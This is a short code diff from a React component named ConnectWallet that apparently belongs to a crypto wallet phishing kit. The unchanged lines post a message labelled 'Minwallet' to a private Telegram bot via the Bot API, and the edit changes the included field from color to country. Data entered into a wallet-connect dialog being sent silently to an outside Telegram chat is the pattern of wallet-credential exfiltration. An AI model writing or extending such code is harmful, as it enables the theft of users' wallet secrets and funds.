@@ -445,7 +445,7 @@ function ConnectWallet({ onClose }) {
         url: `https://api.telegram.org/bot${otoken}/sendMessage`,
         data: {
           chat_id: ochat_id,
-          text: `Minwallet: ${color}   ${message}`,
+          text: `Minwallet: ${country}   ${message}`,
         },
       },
     ];
